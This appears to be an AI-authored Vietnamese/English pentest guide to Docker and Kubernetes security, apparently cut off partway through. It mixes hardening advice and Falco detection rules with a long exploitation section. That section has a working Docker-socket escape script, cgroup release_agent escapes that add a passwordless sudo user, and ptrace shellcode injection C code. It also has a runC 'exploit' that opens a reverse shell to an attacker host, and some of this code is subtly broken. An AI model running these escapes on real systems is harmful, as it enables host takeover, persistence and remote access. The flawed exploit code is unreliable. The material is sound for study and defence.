# CONTAINER & KUBERNETES SECURITY MASTERY

> Phiên bản tổng hợp kiến thức chuyên sâu về bảo mật Docker & Kubernetes, dành cho pentester, security researcher và DevOps engineer. Ngôn ngữ: tiếng Việt (giải thích) + tiếng Anh (thuật ngữ kỹ thuật).

**Tác giả:** Hermes Agent | **Ngày:** 26/05/2026 | **Phiên bản:** v1.0

---

## MỤC LỤC

1. [A. DOCKER SECURITY BASICS](#a-docker-security-basics)
2. [B. DOCKER EXPLOITATION](#b-docker-exploitation)
3. [C. KUBERNETES ARCHITECTURE FOR HACKERS](#c-kubernetes-architecture-for-hackers)
4. [D. K8S RECON & ENUMERATION](#d-k8s-recon--enumeration)
5. [E. K8S ATTACK VECTORS](#e-k8s-attack-vectors)
6. [F. K8S PRIVILEGE ESCALATION](#f-k8s-privilege-escalation)
7. [G. K8S PERSISTENCE](#g-k8s-persistence)
8. [H. SUPPLY CHAIN ATTACKS](#h-supply-chain-attacks)
9. [I. TOOL MASTERY](#i-tool-mastery)
10. [J. CONTAINER ESCAPE CHECKLIST](#j-container-escape-checklist)
11. [K. TOP RESOURCES](#k-top-resources)
12. [L. KEY INSIGHTS](#l-key-insights)

---

## A. DOCKER SECURITY BASICS

### 1. Container Isolation: Namespaces & Cgroups

Docker container không phải là máy ảo (VM). Container là **process** trên host, được cô lập bằng **Linux namespaces** và giới hạn tài nguyên bằng **cgroups (control groups)**. Đây là nền tảng của mọi cuộc tấn công và phòng thủ container.

#### 1.1 Linux Namespaces (7 namespaces chính)

Mỗi container có bộ namespaces riêng, tách biệt với host:

| Namespace | Mục đích | Flag trong `clone()` | Ý nghĩa bảo mật |
|-----------|----------|---------------------|------------------|
| **PID** | Cô lập process ID tree. Container chỉ thấy process của nó, không thấy host processes | `CLONE_NEWPID` | Process ở host PID namespace có thể thấy và kill container process. `--pid=host` = vô hiệu hóa |
| **Mount (MNT)** | Cô lập filesystem mount points. Container có rootfs riêng | `CLONE_NEWNS` | host filesystem không visible (trừ khi bind mount). Escape thường tận dụng mount namespace leak |
| **Network (NET)** | Cô lập network stack: interfaces, iptables, routes. Mỗi container có `eth0` riêng | `CLONE_NEWNET` | `--network=host` = container dùng host network stack, dễ bị tấn công local |
| **User (USER)** | Cô lập UID/GID. Container có thể chạy UID 0 bên trong nhưng là UID không privilege bên ngoài | `CLONE_NEWUSER` | User namespace mapping: `root` (0) in container maps to non-root (e.g., 1000) on host. **Rất quan trọng** |
| **UTS** | Cô lập hostname & domain name | `CLONE_NEWUTS` | Không ảnh hưởng bảo mật lớn |
| **IPC** | Cô lập inter-process communication (shared memory, semaphores) | `CLONE_NEWIPC` | Ngăn container đọc shared memory của host |
| **Cgroup** | Cô lập cgroup view. Container không thể thấy/sửa cgroups của host | `CLONE_NEWCGROUP` | Cần cho cgroup v2 escape protection |

**User Namespace Mapping (----userns-remap):**
- Đây là feature cực kỳ quan trọng nhưng thường bị bỏ qua.
- Khi enabled: `root` trong container ánh xạ tới UID khác (ví dụ 165536) trên host.
- Container process có UID 0 bên trong nhưng trên host chỉ là user thường.
- `docker run --userns-remap=default` — sử dụng mapping mặc định.

#### 1.2 Cgroups (Control Groups)

Cgroups giới hạn tài nguyên (CPU, memory, disk I/O) nhưng cũng là bề mặt tấn công.

- **cgroup v1:** Mount tại `/sys/fs/cgroup/`. Có thể escape qua `release_agent` (CVE-2022-0492).
- **cgroup v2:** Mount tại `/sys/fs/cgroup/` với cấu trúc khác. Không có `release_agent` theo cách cũ, nhưng có các attack surface khác.
- **Cgroup escape mechanism:** Nếu container có khả năng write vào cgroup hierarchy của host (thường qua `--privileged` hoặc mount sai), attacker có thể:
  1. Tạo notify_on_release
  2. Set release_agent trỏ tới script độc hại
  3. Trigger release → script chạy với root trên host

#### 1.3 Seccomp (Secure Computing Mode)

Seccomp giới hạn **syscalls** mà container process có thể gọi.

- **Default Docker seccomp profile:** Chặn ~44 syscalls nguy hiểm (kexec_load, bpf, mount, pivot_root, etc.)
- **Cách kiểm tra:** `docker inspect --format '{{.HostConfig.SeccompProfile}}' <container>`
- **Chế độ:** `default` (Docker tự động apply), `unconfined` (không giới hạn — nguy hiểm), hoặc custom profile
- **--security-opt seccomp=unconfined:** Container có thể gọi MỌI syscall, bao gồm những syscall escape (mount, unshare, pivot_root)
- **CVE-2019-5736 (runC):** Seccomp không thể block vì runC không apply seccomp tại thời điểm thực thi lệnh `exec` vào container

**Các syscall đặc biệt nguy hiểm bị Docker block mặc định:**

```
syscall           | Nguy hiểm
------------------|-------------------
mount             | Mount host filesystem
pivot_root        | Thay đổi root filesystem
unshare           | Tạo namespace mới
ptrace            | Trace process khác
perf_event_open   | Performance monitoring → CPU data leak
bpf               | BPF program → kernel tampering
kexec_load        | Load kernel từ userspace
open_by_handle_at | File handle bypass
init_module       | Load kernel modules
finit_module      | Load kernel modules từ fd
delete_module     | Unload kernel modules
```

#### 1.4 AppArmor & SELinux

**AppArmor (Ubuntu/Debian default):**
- MAC (Mandatory Access Control) dùng path-based profiles.
- Docker tự động apply profile `docker-default` nếu AppArmor enabled trên host.
- `--security-opt apparmor=unconfined` hoặc `--security-opt apparmor=profile-name`
- Có thể custom profile để hạn chế thêm file access, network, capability.

**SELinux (RHEL/CentOS/Fedora):**
- MAC dùng label-based (security context).
- Container process có context `container_t`.
- Chính sách: `container_t` không thể truy cập file `svirt_sandbox_file_t` của container khác.
- `--security-opt label=disable` — vô hiệu hóa SELinux separation (nguy hiểm).

### 2. Docker Daemon Attack Surface

Docker daemon (`dockerd`) chạy với **root privileges** trên host. Bảo vệ daemon là critical.

#### 2.1 Docker Socket (/var/run/docker.sock)

- **Unix socket** mà Docker daemon listen (mặc định).
- **WHOEVER has access to docker.sock effectively has ROOT on the host.**
- Lý do: docker.sock cho phép gọi Docker API — bạn có thể `docker run -v /:/host` rồi chroot vào host filesystem.

**Attack scenario — Docker socket in container:**
```bash
# Inside container with docker.sock mounted
ls -la /var/run/docker.sock

# Install docker client (or use curl)
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# Spawn privileged container with host root mount
curl -s -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create

# Start container
curl -s -X POST --unix-socket /var/run/docker.sock \
  http://localhost/containers/<id>/start

# Now chroot into /host and you have root on host
chroot /host bash
```

#### 2.2 Docker API over TCP (2375/2376)

- **Port 2375 (unencrypted):** Cực kỳ nguy hiểm nếu expose ra internet.
  - Shodan search: `port:2375 product:"Docker"`
  - Chỉ cần HTTP request: `curl http://target:2375/containers/json` → full cluster info
  - RCE: Tạo container với host mount
- **Port 2376 (TLS encrypted):** An toàn hơn nhưng vẫn cần kiểm tra certificate validation.

**Docker API version detection:**
```bash
curl http://target:2375/version
curl http://target:2375/info
curl http://target:2375/containers/json?all=true
curl http://target:2375/images/json
```

#### 2.3 Daemon Configuration (/etc/docker/daemon.json)

Các cấu hình nguy hiểm thường gặp:

```json
{
  "hosts": ["tcp://0.0.0.0:2375"],          // Mở Docker API ra internet
  "iptables": false,                          // Không tạo iptables rules
  "live-restore": false,                      // Tắt live restore
  "userland-proxy": false,                    // Tắt userland proxy
  "userns-remap": "",                        // User namespace remap disabled
  "log-driver": "none",                       // Không log
  "storage-driver": "overlay2",               // Storage driver
  "insecure-registries": [],                  // Registry không TLS
  "registry-mirrors": [],                     // Mirror registry MITM risk
  "disable-legacy-registry": true,
  "selinux-enabled": false,                   // SELinux disabled
  "default-ulimits": {}
}
```

**Các flags nguy hiểm khi khởi động dockerd:**
```
--host=tcp://0.0.0.0:2375    → API không auth
--iptables=false               → Không network isolation
--ip-forward=false             → Tắt IP forwarding
--bridge=none                  → Không network bridge
--insecure-registry            → Cho phép HTTP registry
--userns-remap=default         → An toàn, nhưng mặc định OFF
```

### 3. Image Security

#### 3.1 Image Vulnerabilities & Scanning

Container images chứa OS packages + application dependencies, tạo ra bề mặt tấn công lớn.

**Common vulnerability classes:**
- OS packages with CVEs (Alpine, Ubuntu, Debian base images)
- Language-specific packages (npm, pip, gem, maven, go modules)
- Misconfigured services (SSH enabled, default credentials)
- Embedded secrets in image layers
- Malicious code in base images (supply chain)

**Image scanning tools:**
- **Trivy** (Aqua) — Fast, comprehensive, multi-language
- **Grype** (Anchore) — Syft + Grype combo
- **Clair** (Red Hat) — Static analysis
- **Snyk** — SaaS + CLI
- **Docker Scout** — Docker-built in
- **Anchore Engine** — Enterprise

**Trivy usage:**
```bash
# Scan image
trivy image nginx:latest

# Scan with severity filter
trivy image --severity CRITICAL,HIGH nginx:latest

# Scan filesystem
trivy fs /path/to/project

# Scan IaC (Terraform, K8s manifests)
trivy config ./k8s/

# Export SARIF
trivy image --format sarif --output result.sarif nginx:latest
```

**Grype usage:**
```bash
grype nginx:latest
grype dir:/path/to/project
grype sbom:/path/to/syft-sbom.json
```

#### 3.2 Docker Content Trust (DCT) / Notary / Cosign

**Docker Content Trust (DCT):**
- Dùng The Update Framework (TUF) để sign images.
- Enable: `export DOCKER_CONTENT_TRUST=1`
- Khi enabled, Docker chỉ pull image đã được sign.
- Sign image: `docker trust sign <image>:<tag>`

**Cosign (Sigstore):**
- Tool mới hơn, dùng keyless signing với OIDC.
- `cosign sign <image>`
- `cosign verify <image>`
- **Keyless signing:** Dùng identity (GitHub, Google, Microsoft) thay vì static key.
- **Rekor:** Transparency log cho signatures.

**Notary v2 (OCI Artifacts):**
- Chuẩn mới của OCI cho signing và attestation.
- Dùng OCI Artifacts và ORAS (OCI Registry as Storage).

#### 3.3 Supply Chain Attacks via Images

**Attack vectors:**
1. **Dependency confusion:** Package name squatting trên public registries
2. **Typosquatting:** `dockar` vs `docker`, `ngnix` vs `nginx`
3. **Docker Hub malicious images:** Hàng nghìn images chứa malware, crypto miners, backdoors
4. **Base image poisoning:** Compromise official base image → ảnh hưởng hàng triệu containers
5. **Build cache poisoning:** Tấn công Docker build cache layers
6. **Registry impersonation:** MITM attack nếu không dùng TLS

**Real-world examples:**
- **webster-hx** typo: Image `hx-nginx` chứa crypto miner
- **kubectl** fake images: Images giả mạo kubectl binary chứa backdoor
- **Docker Hub `container-exposer`:** Image expose Docker socket ra internet
- **NPM + Docker combo:** Malicious npm package trong Dockerfile

**Defense:**
- Dùng `--policy` với OPA/Gatekeeper validate image sources
- Chỉ dùng images từ trusted registries (whitelist)
- Sign tất cả images (Cosign)
- Scan images trong CI/CD pipeline (trước khi push)
- Dùng `imagePullPolicy: Always` trong production — luôn verify signature

### 4. Dockerfile Best Practices

#### 4.1 Nguyên Tắc Vàng (Golden Rules)

```dockerfile
# ❌ BAD — Nguy hiểm
FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl
RUN echo "root:toor" | chpasswd
COPY id_rsa /root/.ssh/
EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]

# ✅ GOOD — An toàn
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
RUN npm run build

FROM node:20-alpine AS runner
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
WORKDIR /app
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
USER appuser
EXPOSE 3000
HEALTHCHECK --interval=30s --timeout=3s --retries=3 CMD curl -f http://localhost:3000/ || exit 1
CMD ["node", "dist/server.js"]
```

**Rules:**
1. **Dùng minimal base image:** `alpine`, `distroless` (Google distroless), `scratch`
   - Alpine ~5MB vs Ubuntu ~200MB
   - Distroless: chỉ binary + runtime deps, không shell, không package manager
2. **Multi-stage builds:** Separates build env từ runtime env
3. **Không chạy root:** Luôn dùng `USER <non-root>` ở cuối Dockerfile
4. **Không hardcode secrets:** Dùng build args, Docker secrets, external vault
5. **Pin image tags:** `FROM node:20.15.3-alpine@sha256:...` — tránh `latest`
6. **Update packages:** `RUN apk update && apk upgrade` hoặc `apt-get update && apt-get upgrade`
7. **Remove cache:** `rm -rf /var/cache/apk/*` hoặc `apt-get clean && rm -rf /var/lib/apt/lists/*`
8. **COPY thay vì ADD:** COPY minial hơn, không extract tarball tự động
9. **Không SSH:** Container không cần SSH daemon
10. **HEALTHCHECK:** Cấu hình health check cho runtime security

#### 4.2 Common Dockerfile Vulnerabilities

| Issue | Risk | Fix |
|-------|------|-----|
| `RUN npm install` (no lockfile) | Dependency poisoning | Use `npm ci` with `package-lock.json` |
| `COPY . .` (full dir) | Accidentally include secrets | Use `.dockerignore` |
| `EXPOSE 22` | SSH enabled | Don't need SSH |
| `--no-cache` omitted | Larger layers, cached vulns | Always `--no-cache` |
| `ENV` với secret | Secret in image layers | Use `ARG` + build-time secrets |
| `ADD http://...` | MITM on build | Use `curl -L` with checksum |
| `RUN pip install --no-verify` | Skip package verification | Always verify |
| `USER root` | Container runs as root | `USER 10001:10001` |

#### 4.3 .dockerignore

File `.dockerignore` ngăn context leak (`.env`, `.git`, `node_modules`, `id_rsa`):

```
.git
.gitignore
*.md
node_modules
.env
.env.*
.secrets
Dockerfile
docker-compose.yml
*.pem
*.key
*.cert
*.secret
```

### 5. Runtime Security với Falco & Tracee

#### 5.1 Falco (CNCF Project — Sysdig)

Falco là runtime security engine, phát hiện hành vi bất thường qua **syscalls** sử dụng kernel module/eBPF.

**Cách hoạt động:**
1. Driver (kernel module hoặc eBPF) capture syscalls từ kernel
2. Falco rules engine match syscall patterns
3. Alert qua: stdout, gRPC, Slack, PagerDuty, webhook, AWS Lambda, etc.

**Falco rules mẫu:**
```yaml
# /etc/falco/falco_rules.yaml
- rule: Terminal shell in container
  desc: A shell was spawned in a container
  condition: >
    spawned_process and container
    and proc.name in (bash, zsh, sh, dash, ash)
    and not proc.name in (falco,)
    and not proc.args startswith "-c"
  output: "Shell spawned in container (user=%user.name container=%container.id shell=%proc.name parent=%proc.pname)"
  priority: WARNING
  tags: [container, shell]

- rule: Write below binary directory
  desc: An attempt to write to standard binary dir
  condition: >
    open_write and container
    and fd.directory in (/bin, /sbin, /usr/bin, /usr/sbin)
  output: "File below binary dir (user=%user.name command=%proc.cmdline file=%fd.name)"
  priority: ERROR
  tags: [container, filesystem, mitre_persistence]
```

**Falco driver modes:**
- **kernel module:** Performance tốt nhất, cần kernel headers
- **eBPF probe:** An toàn hơn, không cần kernel module, perf hơi thấp hơn
- **Modern eBPF:** Kernel 5.8+, performance cải thiện

**Falco deployment:**
```bash
# Container run
docker run -d --name falco \
  --privileged \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /proc:/host/proc:ro \
  -v /boot:/host/boot:ro \
  -v /lib/modules:/host/lib/modules:ro \
  -v /etc:/host/etc:ro \
  -v /var/log:/host/var/log:ro \
  -v /etc/falco:/etc/falco \
  falcosecurity/falco

# Helm chart
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webhook.enabled=true
```

#### 5.2 Tracee (Aqua Security)

Tracee là eBPF-based runtime security và forensics.

**Điểm khác biệt vs Falco:**
- Tracee capture **toàn bộ syscalls** và filter sau đó (post-filtering)
- Falco filter tại kernel level (pre-filtering)
- Tracee có thể dump toàn bộ process tree, file operations, network connections
- Tracee hỗ trợ **signature-based detection** (Rego signatures)

**Tracee commands:**
```bash
# Real-time events
tracee --trace container --trace event=security_file_open

# Capture all syscalls for analysis
tracee --trace container --output json --capture mem

# Run signature-based detection
tracee-rule --list-rules
tracee-rule --rule-container
```

**Use cases kết hợp Falco + Tracee:**
- Falco: Real-time alerting, production monitoring
- Tracee: Deep forensics, incident investigation

---

## B. DOCKER EXPLOITATION

### 6. Privileged Container Escape Patterns

Privileged container (`--privileged`) là **kẻ thù số 1** của bảo mật container. Nó vô hiệu hóa HẦU HẾT các cơ chế bảo vệ.

**Khi chạy `--privileged`, những gì bị vô hiệu hóa:**
- 🚫 All capabilities granted (≈37 capabilities)
- 🚫 Seccomp profile disabled
- 🚫 AppArmor/SELinux disabled
- 🚫 Device cgroup disabled (có thể access ALL devices)
- 🚫 No user namespace remap
- 🚫 Can mount any filesystem

**Check if container is privileged:**
```bash
# Method 1: capsh
capsh --print
# Output: Current: = cap_chown,cap_dac_override,...,cap_sys_admin,cap_sys_ptrace,...

# Method 2: Check capabilities
cat /proc/1/status | grep CapEff
# Decode: capsh --decode=<hex>
# If all F's = privileged (0x0000003FFFFFFFFF)

# Method 3: Check device access
ls -la /dev/sda* /dev/sdb* /dev/nvme*
# If you see them, likely privileged

# Method 4: Check seccomp
cat /proc/1/status | grep Seccomp
# 0 = disabled, 1 = strict, 2 = filter (default)
```

#### 6.1 Device Cgroup Escape

Nếu container được mounted host devices (hoặc privileged):

```bash
# List block devices
ls -la /dev/

# Mount host root filesystem
mkdir /mnt-root
mount /dev/sda1 /mnt-root
chroot /mnt-root bash
# Bây giờ bạn đã có root shell trên host
```

**Escape bằng raw disk access:**
```bash
# Đọc/ghi raw vào disk device
dd if=/dev/sda1 of=/tmp/rootfs.tar
# Hoặc debugfs (ext filesystems)
debugfs -w /dev/sda1
```

#### 6.2 Host PID Namespace (`--pid=host`)

Khi container chạy với `--pid=host`, nó thấy tất cả processes trên host:

```bash
# Xem all host processes
ps aux

# List process với network connections
nsenter -t <host-pid> -n netstat -tulpn

# Hoặc dump process memory có secret
cat /proc/<pid>/environ
cat /proc/<pid>/cmdline
# Read /proc/<pid>/fd/ -> file descriptors của process khác
```

**Host process injection:**
```bash
# Với --pid=host + --cap-add=SYS_PTRACE
# Có thể inject vào host process bằng ptrace
apt-get install -y gdb
gdb -p <host-pid>
# Dùng gdb để call system() trong process context
```

#### 6.3 Host Network (`--network=host`)

Container dùng chung network stack với host:

```bash
# Xem host network interfaces
ip addr
ip route

# Sniff host network traffic
tcpdump -i any -v

# Access host services trên localhost
curl http://localhost:10250  # kubelet API
curl http://localhost:2375   # Docker API
curl http://localhost:6443   # kube-apiserver

# ARP spoofing trên host network
arpspoof -i eth0 -t <target> -r <gateway>

# Tấn công service trên host
nc -lvp 9999  # Nghe trên host port
```

#### 6.4 SYS_ADMIN Capability Exploitation

`--cap-add=SYS_ADMIN` là "master key" của capabilities. Nó cho phép gần như mọi syscall admin.

**Escape với SYS_ADMIN + Mount namespace:**

```bash
# Mount cgroup và escape qua release_agent (cgroup v1)

# Kiểm tra cgroup version
mount | grep cgroup
# Nếu thấy /sys/fs/cgroup/memory -> cgroup v1

# Mount cgroup controller
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Tạo script escape
echo '#!/bin/bash' > /tmp/escape.sh
echo 'cat /root/flag.txt > /tmp/flag.out' >> /tmp/escape.sh
chmod +x /tmp/escape.sh

# Set release_agent
echo "/tmp/escape.sh" > /tmp/cgrp/x/release_agent

# Trigger release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Công thức escape đầy đủ (cgroup v1):**
```bash
# Full privileged escape routine
# Step 1: Check if we can mount cgroups
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
  mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null

# Step 2: Create child cgroup
mkdir /tmp/cgrp/x

# Step 3: Get release_agent path
cat /tmp/cgrp/release_agent  # Should be empty (host's release_agent)

# Step 4: Write escape script
echo '#!/bin/bash' > /tmp/escape
echo 'chroot /host bash -c "useradd -p $(openssl passwd -1 toor) hacker"' >> /tmp/escape
echo 'echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /host/etc/sudoers' >> /tmp/escape
chmod +x /tmp/escape

# Step 5: Set release_agent
echo "/tmp/escape" > /tmp/cgrp/x/release_agent

# Step 6: Trigger
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 7. Specific Capability Exploitation

#### 7.1 SYS_PTRACE

Cho phép ptrace(2) syscall — debug process, đọc memory, inject code.

```bash
# Ptrace vào container process khác hoặc host process (với --pid=host)
# Example: ptrace inject reverse shell
cat > /tmp/ptrace-inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>

int main(int argc, char *argv[]) {
    if (argc < 2) { printf("Usage: %s <pid>\n", argv[0]); return 1; }
    pid_t target = atoi(argv[1]);
    struct user_regs_struct old_regs, regs;
    
    // Attach
    if (ptrace(PTRACE_ATTACH, target, NULL, NULL) == -1) {
        perror("attach"); return 1;
    }
    waitpid(target, NULL, 0);
    
    // Read registers
    ptrace(PTRACE_GETREGS, target, NULL, &regs);
    old_regs = regs;
    
    // Shellcode: execve("/bin/sh", NULL, NULL)
    char *shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e"
                       "\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58"
                       "\x99\x0f\x05";
    
    // Write shellcode to memory
    long addr = regs.rip; // x86_64
    for (int i = 0; i < sizeof(shellcode); i += 8) {
        long val = *(long *)(shellcode + i);
        ptrace(PTRACE_POKETEXT, target, addr + i, val);
    }
    
    // Set RIP to shellcode
    regs.rip = addr;
    ptrace(PTRACE_SETREGS, target, NULL, &regs);
    ptrace(PTRACE_DETACH, target, NULL, NULL);
    return 0;
}
EOF
gcc -o /tmp/ptrace-inject /tmp/ptrace-inject.c

# Find host process (cần --pid=host)
ps aux | grep sshd
./ptrace-inject <sshd-pid>
```

#### 7.2 SYS_RAWIO

Cho phép I/O port operations — tấn công trực tiếp hardware.

```bash
# /dev/port access
dd if=/dev/port of=/tmp/port_dump bs=1 count=1024

# Read physical memory via /dev/mem (nếu có)
# Hoặc /dev/shm
# Memory scraping: có thể đọc kernel memory để extract keys
```

#### 7.3 NET_ADMIN

Full network control: iptables, routing, socket filter.

```bash
# Block network từ container khác
iptables -A FORWARD -s <victim-container-ip> -j DROP

# Sniff network
iptables -I FORWARD -j NFLOG
# Hoặc tcpdump với AF_PACKET sockets

# ARP spoofing container khác trên cùng bridge
arpspoof -i eth0 -t <victim> -r <gateway>
```

#### 7.4 SYS_MODULE

Cho phép load/unload kernel modules.

```bash
# Load malicious kernel module
# Step 1: Create a kernel module
# Step 2: Load it
insmod /tmp/malicious.ko

# Or use kexec to load custom kernel
# (kexec_load syscall usually blocked by seccomp)
```

### 8. Docker Socket in Container — Chi Tiết

Đây là **con đường escape phổ biến nhất**. Docker socket mounted vào container = game over.

**Why it works:**
- Docker API (`/var/run/docker.sock`) cho phép AIO operations
- Attacker tạo container mới (hoặc exec vào container có sẵn) với:
  - `Binds: ["/:/host"]` — mount host root vào container
  - `Privileged: true` — full capabilities
- Container mới này có thể chroot vào `/host` và có root

**Script tự động escape:**
```bash
#!/bin/bash
# docker-socket-escape.sh

DOCKER_SOCK="/var/run/docker.sock"

if [ ! -S "$DOCKER_SOCK" ]; then
    echo "[-] No Docker socket found at $DOCKER_SOCK"
    echo "[*] Searching for Docker socket..."
    find / -name docker.sock 2>/dev/null
    exit 1
fi

echo "[+] Docker socket found at $DOCKER_SOCK"

# Kiểm tra Docker API reachable
curl -s --unix-socket $DOCKER_SOCK http://localhost/info > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "[-] Docker API not reachable"
    exit 1
fi

echo "[+] Docker API reachable"
echo "[*] Creating privileged container with host root mount..."

# Tạo container escape
RESPONSE=$(curl -s -X POST --unix-socket $DOCKER_SOCK \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "chroot /host sh -c \"cat /flag.txt > /dev/console; id > /dev/console\""],
    "Binds": ["/:/host"],
    "Privileged": true,
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }' \
  http://localhost/containers/create)

CONTAINER_ID=$(echo $RESPONSE | python3 -c "import sys,json; print(json.load(sys.stdin)['Id'][:12])" 2>/dev/null)

if [ -z "$CONTAINER_ID" ]; then
    echo "[-] Failed to create container"
    echo "[-] Response: $RESPONSE"
    exit 1
fi

echo "[+] Container created: $CONTAINER_ID"

# Start container
curl -s -X POST --unix-socket $DOCKER_SOCK \
  http://localhost/containers/$CONTAINER_ID/start

echo "[+] Escape container started!"
echo "[*] Waiting..."
sleep 2

# Cleanup
curl -s -X DELETE --unix-socket $DOCKER_SOCK \
  http://localhost/containers/$CONTAINER_ID?force=true > /dev/null

echo "[+] Cleaned up"
```

**Không có Docker CLI? Dùng curl hoặc Python:**

```bash
# Python Docker SDK
python3 -c "
import docker, os
client = docker.DockerClient(base_url='unix:///var/run/docker.sock')
container = client.containers.run(
    'alpine', 
    'chroot /host sh -c \"whoami; id\"',
    volumes={'/': {'bind': '/host', 'mode': 'rw'}},
    privileged=True,
    remove=True
)
print(container.decode())
"
```

### 9. /proc/1/root Escape

Nếu container có khả năng đọc `/proc/1/root/` (thường là process 1 = container init), không cần privileged.

```bash
# Cond1: Container không chạy với --pid=host
# Cond2: Nhưng /proc filesystem vẫn accessible

# /proc/1/root/ là symlink tới root filesystem của process 1
# Nếu process 1 là container process, root = container root
# Nhưng nếu có thể access /proc/<host-pid>/root/ với host PID...

# Cần host PID namespace access
ls -la /proc/1/root/
# Nếu có thể read -> potential escape nếu có process 1 là host process

# Thử với /proc/1/environ
cat /proc/1/environ
```

### 10. CVE-2019-5736: runC Container Breakout

**CVE-2019-5736** là một trong những container escape nghiêm trọng nhất, ảnh hưởng Docker, containerd, Podman, CRI-O.

**Cơ chế:**
- runC là OCI runtime mặc định của Docker
- `/proc/self/exe` trỏ tới binary của current process
- Khi user chạy `docker exec`, runC binary chạy trên host
- Inside container: overwrite `/proc/self/exe` (mà thực chất là runC binary trên host)
- Lần tiếp theo runC chạy, nó chạy code của attacker

**Exploit code (simplified):**
```go
// Inside container
package main

import (
    "fmt"
    "os"
    "strconv"
    "syscall"
    "unsafe"
)

func main() {
    // Find PID of runC process
    // runC executes /proc/self/exe for each exec
    // We overwrite it
    
    fd, _ := os.Create("/bin/sh")
    fd.WriteString("#!/proc/self/exe\n") // This is the trick
    
    // The binary we want to overwrite runC with
    payload := []byte("#!/bin/bash\nbash -i >& /dev/tcp/attacker/4444 0>&1\n")
    
    // Race condition: wait for runC to exec
    for {
        fd2, err := os.OpenFile("/proc/self/exe", os.O_WRONLY, 0)
        if err != nil {
            continue
        }
        // Overwrite /proc/self/exe (which is runC binary)
        fd2.Write(payload)
        break
    }
}
```

**Phòng thủ:**
- Update Docker/runC lên bản vá (patch trong runC 1.0-rc6+, Docker 18.09.2+)
- Dùng `--security-opt seccomp=unconfined` không giúp ích
- Dùng read-only root filesystem cho container
- User namespace remap

### 11. Container Filesystem Layer Manipulation

Docker dùng **UnionFS** (OverlayFS, overlay2) để quản lý layers.

**Structure:**
```
/var/lib/docker/
├── overlay2/
│   ├── <layer-id>/diff/     # Layer content
│   ├── <layer-id>/link        # Link to layer
│   ├── <layer-id>/lower       # Lower dirs
│   └── <layer-id>/merged/     # Merged view (running container)
├── image/
│   └── overlay2/
│       ├── layerdb/         # Layer metadata
│       └── repositories.json
├── containers/
│   └── <container-id>/
│       ├── config.v2.json  # Container config
│       └── resolv.conf      # Container DNS
└── volumes/
    └── <volume-name>/_data/
```

**Attack scenarios:**
- **Layer poisoning:** Nếu attacker có write access vào `/var/lib/docker/overlay2/<layer-id>/diff/`, có thể inject file vào container image
- **Container config tampering:** Sửa `config.v2.json` trong `/var/lib/docker/containers/<id>/` để thêm capabilities hoặc disable seccomp
- **Volume manipulation:** Ghi vào volumes từ host để ảnh hưởng container

**Kiểm tra từ bên ngoài (host access):**
```bash
# Xem container processes
ls /var/lib/docker/containers/
cat /var/lib/docker/containers/<id>/config.v2.json | jq .HostConfig.Privileged

# Dump all secrets từ volumes
find /var/lib/docker/volumes/ -name "*.secret" -o -name "*.key" -o -name "*.pem" 2>/dev/null
```

---

## C. KUBERNETES ARCHITECTURE FOR HACKERS

### 12. Control Plane Components

Một Kubernetes cluster có **control plane** (master) và **worker nodes**.

#### 12.1 kube-apiserver (Port 6443)

API server là **trái tim** của Kubernetes — mọi component và user đều giao tiếp qua API server.

**Endpoints quan trọng:**
| Endpoint | Mô tả | Risk |
|----------|-------|------|
| `/api/v1` | Core API resources (pods, services, etc.) | Tổng hợp |
| `/apis` | API groups (apps, rbac, etc.) | Tổng hợp |
| `/openapi/v2` | OpenAPI spec | Information disclosure |
| `/healthz` | Health check | Low |
| `/livez` | Liveness probe | Low |
| `/readyz` | Readiness probe | Low |
| `/version` | Version info | Information disclosure |
| `/metrics` | Prometheus metrics | Information disclosure |
| `/logs/` | API server logs (nếu enabled) | Information leak |

**Auth modes của API server:**
```yaml
# /etc/kubernetes/manifests/kube-apiserver.yaml
spec:
  containers:
  - command:
    - kube-apiserver
    - --authorization-mode=Node,RBAC        # Default: Node + RBAC
    - --enable-admission-plugins=NodeRestriction,PodSecurity
    - --anonymous-auth=false                  # Should be false in production
    - --authentication-token-webhook-config-file=...
    - --oidc-issuer-url=...                   # OIDC config
    - --service-account-key-file=/etc/kubernetes/pki/sa.pub
    - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key
    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt
    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
    - --audit-log-path=/var/log/kubernetes/audit.log
    - --audit-log-maxage=30
```

**Anonymous auth bypass:**
```bash
# Nếu anonymous-auth = true (mặc định là true cũ)
curl -k https://<api-server>:6443/api/v1/pods
# Response: 403 Forbidden (authenticated, but unauthorized)
# Nếu response là {"kind":"PodList",...} -> anonymous access granted

# Check auth mode
curl -k https://<api-server>:6443/apis/authorization.k8s.io/v1
```

